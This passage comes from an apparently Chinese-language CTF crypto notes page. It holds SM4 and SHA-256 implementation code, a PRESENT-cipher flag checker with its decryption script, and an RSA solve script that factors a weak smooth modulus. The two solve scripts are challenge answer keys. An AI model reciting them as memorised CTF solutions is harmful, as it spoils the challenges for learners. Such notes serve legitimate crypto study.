class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title">sm4F</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> x0, <span class="type">unsigned</span> <span class="type">long</span> x1, <span class="type">unsigned</span> <span class="type">long</span> x2, <span class="type">unsigned</span> <span class="type">long</span> x3, <span class="type">unsigned</span> <span class="type">long</span> rk)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x0^<span class="built_in">sm4Lt</span>(x1^x2^x3^rk));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sm4_one_round</span><span class="params">( <span class="type">unsigned</span> <span class="type">long</span> sk[<span class="number">32</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">16</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">unsigned</span> <span class="type">char</span> output[<span class="number">16</span>] )</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ulbuf[<span class="number">36</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(ulbuf, <span class="number">0</span>, <span class="built_in">sizeof</span>(ulbuf));</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( ulbuf[<span class="number">0</span>], input, <span class="number">0</span> )</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( ulbuf[<span class="number">1</span>], input, <span class="number">4</span> )</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( ulbuf[<span class="number">2</span>], input, <span class="number">8</span> )</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( ulbuf[<span class="number">3</span>], input, <span class="number">12</span> )</span><br><span class="line">  <span class="keyword">while</span>(i&lt;<span class="number">32</span>) &#123;</span><br><span class="line">    ulbuf[i+<span class="number">4</span>] = <span class="built_in">sm4F</span>(ulbuf[i], ulbuf[i+<span class="number">1</span>], ulbuf[i+<span class="number">2</span>], ulbuf[i+<span class="number">3</span>], sk[i]);</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">35</span>],output,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">34</span>],output,<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">33</span>],output,<span class="number">8</span>);</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">32</span>],output,<span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title">sm4CalciRK</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> ka)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> bb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rk = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">4</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> b[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ka,a,<span class="number">0</span>)</span><br><span class="line">  b[<span class="number">0</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">0</span>]);</span><br><span class="line">  b[<span class="number">1</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">1</span>]);</span><br><span class="line">  b[<span class="number">2</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">2</span>]);</span><br><span class="line">  b[<span class="number">3</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">3</span>]);</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(bb,b,<span class="number">0</span>)</span><br><span class="line">  rk = bb^(<span class="built_in">ROTL</span>(bb, <span class="number">13</span>))^(<span class="built_in">ROTL</span>(bb, <span class="number">23</span>));</span><br><span class="line">  <span class="keyword">return</span> rk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sm4_setkey</span><span class="params">( <span class="type">unsigned</span> <span class="type">long</span> sk[<span class="number">32</span>], <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>] )</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> MK[<span class="number">4</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> k[<span class="number">36</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( MK[<span class="number">0</span>], key, <span class="number">0</span> );</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( MK[<span class="number">1</span>], key, <span class="number">4</span> );</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( MK[<span class="number">2</span>], key, <span class="number">8</span> );</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>( MK[<span class="number">3</span>], key, <span class="number">12</span> );</span><br><span class="line">  k[<span class="number">0</span>] = MK[<span class="number">0</span>]^FK[<span class="number">0</span>];</span><br><span class="line">  k[<span class="number">1</span>] = MK[<span class="number">1</span>]^FK[<span class="number">1</span>];</span><br><span class="line">  k[<span class="number">2</span>] = MK[<span class="number">2</span>]^FK[<span class="number">2</span>];</span><br><span class="line">  k[<span class="number">3</span>] = MK[<span class="number">3</span>]^FK[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span>(; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">    k[i+<span class="number">4</span>] = k[i] ^ (<span class="built_in">sm4CalciRK</span>(k[i+<span class="number">1</span>]^k[i+<span class="number">2</span>]^k[i+<span class="number">3</span>]^CK[i]));</span><br><span class="line">    sk[i] = k[i+<span class="number">4</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>] = &#123;<span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">16</span>] = &#123;<span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> output[<span class="number">16</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> sk[<span class="number">32</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sm4_setkey</span>(sk,key);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sm4_one_round</span>(sk, input,output);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, output[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="blowfish"><a class="markdownIt-Anchor" href="#blowfish">#</a> Blowfish</h4>
<h4 id="twofish"><a class="markdownIt-Anchor" href="#twofish">#</a> Twofish</h4>
<h4 id="serpent"><a class="markdownIt-Anchor" href="#serpent">#</a> Serpent</h4>
<p>在线工具请：<br>
<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p>
<h4 id="present"><a class="markdownIt-Anchor" href="#present">#</a> PRESENT</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Sbox = [<span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">PBox = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">33</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">34</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">35</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">4</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">52</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">39</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">8</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">56</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">43</span>, <span class="number">59</span>,</span><br><span class="line">    <span class="number">12</span>, <span class="number">28</span>, <span class="number">44</span>, <span class="number">60</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">61</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">46</span>, <span class="number">62</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">63</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state, roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox[(state &gt;&gt; (i * <span class="number">4</span>)) &amp; <span class="number">15</span>] &lt;&lt; (i * <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; PBox[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([(<span class="built_in">ord</span>(i[c]) &lt;&lt; (<span class="number">8</span> * c)) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds + <span class="number">1</span>):</span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        key = ((key &amp; <span class="number">524287</span>) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; ((<span class="number">2</span> ** <span class="number">76</span>) - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        key ^= i &lt;&lt; <span class="number">15</span></span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">blocks</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    out = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = string2number(block)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state, roundkeys[i])</span><br><span class="line">            state = sBoxLayer(state)</span><br><span class="line">            state = pLayer(state)</span><br><span class="line"></span><br><span class="line">        cipher = addRoundKey(state, roundkeys[-<span class="number">1</span>])</span><br><span class="line">        out.append(cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&#x27;pls input ur flag:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(inp) != <span class="number">32</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">blocks = [inp[:<span class="number">8</span>], inp[<span class="number">8</span>:<span class="number">16</span>], inp[<span class="number">16</span>:<span class="number">24</span>], inp[<span class="number">24</span>:<span class="number">32</span>]]</span><br><span class="line"></span><br><span class="line">out_blocks = encrypt(blocks)</span><br><span class="line"></span><br><span class="line">解密脚本直接逆着写就行，这里的输入是<span class="number">32</span>位的，然后分块。</span><br><span class="line">```python</span><br><span class="line">Sbox = [<span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">PBox = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">33</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">34</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">35</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">4</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">52</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">39</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">8</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">56</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">43</span>, <span class="number">59</span>,</span><br><span class="line">    <span class="number">12</span>, <span class="number">28</span>, <span class="number">44</span>, <span class="number">60</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">61</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">46</span>, <span class="number">62</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">63</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state, roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds + <span class="number">1</span>):</span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        key = ((key &amp; <span class="number">524287</span>) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; ((<span class="number">2</span> ** <span class="number">76</span>) - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        key ^= (i &lt;&lt; <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox_inv[(state &gt;&gt; (i * <span class="number">4</span>)) &amp; <span class="number">15</span>] &lt;&lt; (i * <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">number2string</span>(<span class="params">n</span>):</span><br><span class="line">    chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        chars.append(<span class="built_in">chr</span>((n &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphers</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    out = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">        state = cipher</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state, roundkeys[i])</span><br><span class="line">            state = inv_pLayer(state)</span><br><span class="line">            state = inv_sBoxLayer(state)</span><br><span class="line"></span><br><span class="line">        block = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        out.append(number2string(block))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line"></span><br><span class="line">decrypted_flag = decrypt(cmps)</span><br><span class="line"><span class="built_in">print</span>(decrypted_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 非对称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### RSA</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">36618139579386063246087882054063631367923586826293230665209915187491823328978276724908066032487515386697740611819366867179565337532194305783987450587518624526250530134446397</span></span><br><span class="line">c = <span class="number">3053043969587277731075013823380664207370991627277672374256662715889363487017560381573682876563907215099359894935326265406537547932246927604121814198201993671878573628633125</span></span><br><span class="line">p=[<span class="number">521</span>,<span class="number">521</span>,<span class="number">521</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">557</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">631</span>,<span class="number">631</span>,<span class="number">631</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">683</span>,<span class="number">701</span>,<span class="number">701</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">727</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">787</span>,<span class="number">809</span>,<span class="number">821</span>,<span class="number">821</span>,<span class="number">821</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">907</span>,<span class="number">907</span>,<span class="number">907</span>,<span class="number">907</span>,<span class="number">907</span>,<span class="number">919</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">953</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">967</span>,<span class="number">991</span>,<span class="number">997</span>,<span class="number">997</span>,<span class="number">1019</span>]</span><br><span class="line"></span><br><span class="line">p.append(<span class="number">521</span>)</span><br><span class="line">phi=<span class="number">1</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> (a==i):</span><br><span class="line">        phi*=i</span><br><span class="line">    phi*=i-<span class="number">1</span></span><br><span class="line">    a=i</span><br><span class="line"></span><br><span class="line"><span class="comment"># phi = (p - 1) * (q - 1)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="校验"><a class="markdownIt-Anchor" href="#校验">#</a> 校验</h2>
<h4 id="sha系列"><a class="markdownIt-Anchor" href="#sha系列">#</a> sha 系列</h4>
<p>cyberchef 本地请</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GROUP_SIZE 64 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span> K[<span class="number">64</span>] =&#123;</span><br><span class="line">        <span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>, <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>,  </span><br><span class="line">        <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>, <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>,  </span><br><span class="line">        <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>, <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>,  </span><br><span class="line">        <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>, <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>,  </span><br><span class="line">        <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>, <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>,  </span><br><span class="line">        <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>, <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>,  </span><br><span class="line">        <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>, <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>,  </span><br><span class="line">        <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>, <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span>  </span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">ROR</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x, <span class="type">unsigned</span> <span class="type">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">SHR</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x,<span class="type">unsigned</span> <span class="type">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Ch</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> E,<span class="type">unsigned</span> <span class="type">int</span> F,<span class="type">unsigned</span> <span class="type">int</span> G)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Maj</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> A,<span class="type">unsigned</span> <span class="type">int</span> B,<span class="type">unsigned</span> <span class="type">int</span> C)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Lsigma_0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> A)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Lsigma_1</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> E)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Ssigma_0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Ssigma_1</span><span 